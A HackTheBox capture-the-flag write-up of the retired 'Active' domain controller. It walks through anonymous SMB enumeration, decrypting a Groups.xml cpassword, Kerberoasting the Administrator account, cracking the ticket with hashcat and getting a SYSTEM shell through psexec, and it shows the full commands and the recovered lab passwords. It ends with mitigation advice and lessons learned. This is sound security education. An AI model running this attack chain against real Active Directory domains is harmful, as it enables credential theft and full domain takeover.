# Active

```text
Platform    : HackTheBox
OS          : Windows
Difficulty  : Easy
Category    : Active Directory / SMB / GPP / Kerberoasting
IP          : 10.129.56.80
```

---

## Summary

Initial enumeration identified the target as a Windows Server 2008 R2
Domain Controller for the `active.htb` domain, exposing several
Active Directory-related services including LDAP, Kerberos and SMB.

SMB enumeration revealed a `Replication` directory that was accessible
without authentication. Enumerating the available files eventually led
to a Group Policy Preferences configuration file named `Groups.xml`.

The file contained a `cpassword` value associated with the
`active.htb\SVC_TGS` account. This value was decrypted using
`gpp-decrypt`, recovering valid credentials for the service account.

Those credentials were then used to perform Kerberoasting. A Service
Principal Name (SPN) associated with the `Administrator` account was
identified, allowing a Kerberos TGS ticket to be requested and its
encrypted portion extracted for offline password cracking.

The resulting hash was cracked with Hashcat, revealing the
`Administrator` password. The credentials were validated against SMB
and then used with `psexec` to obtain administrative execution on the
Domain Controller.

---

## Reconnaissance

A full TCP port scan was performed first:

```bash
nmap -p- -sS --min-rate 5000 -vvv -Pn --open 10.129.56.80 -oN scan.txt
```

The scan identified the following relevant ports:

```text
53/tcp       DNS
88/tcp       Kerberos
135/tcp      MSRPC
139/tcp      NetBIOS
389/tcp      LDAP
445/tcp      SMB
464/tcp      Kerberos password change
593/tcp      RPC over HTTP
636/tcp      LDAPS
3268/tcp     Global Catalog LDAP
3269/tcp     Global Catalog LDAPS
5722/tcp     DFSR
9389/tcp     Active Directory Web Services
```

A service enumeration scan was then performed:

```bash
nmap -p 135,139,3268,3269,389,445,464,49152,49153,49154,49155,49157,49158,49162,49167,49168,53,5722,593,636,88,9389 -sCV 10.129.56.80
```

The results identified the host as:

* **Hostname:** `DC`
* **Domain:** `active.htb`
* **OS:** Windows Server 2008 R2 SP1
* **LDAP:** Active Directory
* **Kerberos:** exposed on port 88
* **SMB:** exposed on port 445

The combination of LDAP, Kerberos, Global Catalog and SMB indicated
that this host was an Active Directory Domain Controller.

---

## Enumeration

### SMB Enumeration

SMB enumeration was performed with:

```bash
smbclient -L //VICTIM.IP/
```

During the enumeration, a `Replication` directory was found to be
accessible without authentication.

This allowed the SMB shares and their contents to be enumerated
without having valid domain credentials.

Further enumeration of the available directories eventually led to
the following Group Policy path:

```text
\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
```

Inside the directory was a file named:

```text
Groups.xml
```

```text
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> dir

Groups.xml
```

### Group Policy Preferences — `Groups.xml`

The `Groups.xml` file contained a user configuration with an encrypted
`cpassword` value:

```xml
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
name="active.htb\SVC_TGS"
image="2"
changed="2018-07-18 20:46:06"
uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
<Properties
action="U"
newName=""
fullName=""
description=""
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
changeLogon="0"
noChange="1"
neverExpires="1"
acctDisabled="0"
userName="active.htb\SVC_TGS"/>
</User>
</Groups>
```

The important values were:

```text
Username:
active.htb\SVC_TGS

cpassword:
edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

`cpassword` is a value historically used by **Group Policy
Preferences (GPP)** to store passwords configured through certain
Group Policy settings.

The password was encrypted rather than stored directly in plaintext,
but the encryption mechanism used by GPP was reversible because the
key required to decrypt these values was publicly known.

The value was decrypted using:

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

This returned the following credentials:

```text
SVC_TGS : GPPstillStandingStrong2k18
```

---

## Foothold

The recovered credentials were first validated against the SMB
service:

```bash
crackmapexec smb 10.129.56.80 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
```

The credentials were valid:

```text
SMB  10.129.56.80  445  DC
[*] Windows 7 / Server 2008 R2 Build 7601 x64
(name:DC) (domain:active.htb) (signing:True) (SMBv1:False)

[+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
```

At this point, valid domain credentials had been obtained.

However, the `SVC_TGS` account itself did not provide the final
administrative access. Since Kerberos was exposed and valid domain
credentials were available, the next step was to enumerate accounts
with Service Principal Names.

---

## Privilege Escalation — Administrator

### Kerberoasting

Kerberoasting abuses the way Kerberos handles service accounts with
registered **Service Principal Names (SPNs)**.

An authenticated domain user can request a Ticket Granting Service
(TGS) ticket for an account associated with an SPN. The ticket contains
data encrypted using a key derived from that account's password.

The important point is that the returned ticket can be taken offline
and attacked without continuously interacting with the Domain
Controller.

Using the recovered `SVC_TGS` credentials, SPNs were enumerated and
TGS tickets were requested with:

```bash
impacket-GetUserSPNs active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.56.80 -request
```

The output identified an SPN associated with the `Administrator`
account:

```text
ServicePrincipalName    Name
---------------------   -------------
active/CIFS:445         Administrator
```

The command also returned a Kerberos TGS hash:

```text
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*...
```

The hash was saved to `hash.txt` for offline cracking.

### Cracking the TGS

Hashcat was used with mode `13100`, corresponding to Kerberos 5
TGS-REP etype 23:

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

The hash was successfully cracked:

```text
Administrator : Ticketmaster1968
```

This recovered the password for the domain `Administrator` account.

The credentials were then validated against SMB:

```bash
crackmapexec smb 10.129.56.80 -u 'Administrator' -p 'Ticketmaster1968'
```

The result confirmed administrative access:

```text
SMB  10.129.56.80  445  DC
[*] Windows 7 / Server 2008 R2 Build 7601 x64
(name:DC) (domain:active.htb) (signing:True) (SMBv1:False)

[+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
```

The `Pwn3d!` result indicated that the recovered credentials had
administrative privileges over SMB.

### Obtaining a System Shell

The `Administrator` credentials were then used with `psexec` to obtain
remote command execution on the Domain Controller.

This resulted in execution with:

```text
NT AUTHORITY\SYSTEM
```

At this point, the machine was fully compromised.

```text
C:\Windows\system32> whoami
nt authority\system
```

The flags could then be retrieved from the corresponding user and
administrator locations:

```text
user.txt:
<USER_FLAG>

root.txt:
<ROOT_FLAG>
```

---

## Root Cause & Mitigation

### Exposed Group Policy Preferences credentials

The initial weakness was the exposure of the `Groups.xml` file through
an SMB-accessible replication directory.

The file contained a `cpassword` associated with the `SVC_TGS` account.
Although the password was not stored directly in plaintext, the
historical GPP encryption mechanism was not sufficient to protect the
credential because the decryption key was publicly known.

An attacker who can read the relevant Group Policy files can therefore
recover credentials configured through vulnerable GPP mechanisms.

**How to mitigate it:**

* Remove old Group Policy Preferences configurations that contain
  password-based credentials.
* Avoid using GPP to distribute passwords.
* Rotate any credentials that have previously been stored in
  `Groups.xml`.
* Restrict anonymous or unauthenticated access to SMB shares and
  replication-related data.
* Apply appropriate permissions to `SYSVOL` and other domain
  resources so that only intended users can read sensitive
  configuration data.

### Kerberoastable Administrator account

The `Administrator` account had an SPN associated with it:

```text
active/CIFS:445
```

This allowed an authenticated user to request a TGS for the account.
The resulting ticket could then be attacked offline.

The password was weak enough to be recovered using the
`rockyou.txt` wordlist.

**How to mitigate it:**

* Do not associate SPNs with highly privileged accounts such as
  Domain Administrators where unnecessary.
* Use dedicated service accounts with the minimum privileges required.
* Use strong, unique and sufficiently long passwords for service
  accounts.
* Prefer managed service accounts where possible.
* Monitor for unusual bursts of TGS requests, particularly requests
  targeting privileged accounts.
* Ensure privileged accounts are not used as ordinary service accounts.

### Excessive privilege of the recovered account

Once the `Administrator` password was recovered, it provided complete
administrative control over the Domain Controller.

Administrative credentials should be isolated from normal service
accounts and protected through least privilege and administrative
tiering.

---

## Lessons Learned

* **Always enumerate SMB thoroughly.** An apparently simple SMB service
  can expose domain configuration and authentication material.
* **GPP files deserve immediate attention.** When `Groups.xml` appears
  during Active Directory enumeration, checking for `cpassword` values
  should be a priority.
* **A low-privileged domain account can be enough for Kerberoasting.**
  Having valid credentials does not necessarily mean that the account
  itself is privileged; it may simply provide the authentication
  required to request TGS tickets.
* **Always inspect SPNs for privileged accounts.** A service account
  configuration associated with `Administrator` turned the initial
  `SVC_TGS` credentials into a path toward full domain compromise.
* **Offline cracking is particularly dangerous for Kerberoasting.**
  Once the TGS hash was obtained, the password could be attacked without
  further authentication attempts against the Domain Controller.
* **Credential reuse and weak passwords can chain vulnerabilities
  together.** The initial GPP exposure provided `SVC_TGS` credentials,
  which enabled Kerberoasting, which in turn exposed the
  `Administrator` password.

---

<sub>Write-up published after machine retirement, per HackTheBox disclosure policy.</sub>
